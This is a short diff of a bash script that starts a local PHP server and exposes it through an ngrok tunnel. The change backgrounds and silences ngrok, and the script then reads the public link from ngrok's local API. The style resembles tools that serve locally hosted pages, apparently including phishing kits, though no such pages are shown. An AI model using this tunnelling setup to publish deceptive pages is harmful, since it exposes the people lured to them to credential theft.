@@ -73,7 +73,7 @@ php -S localhost:5555 > /dev/null 2>&1 &
 echo
 echo -e "[${Green}✔${clear}] ${IYellow}GENERATING LINK PLEASE WAIT... ${clear}"
 
-$HOME/ngrok http 5555 ccc
+$HOME/ngrok http 5555 > /dev/null 2>&1 &
 sleep 7
 #below lines can be sued for generating direct link.
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
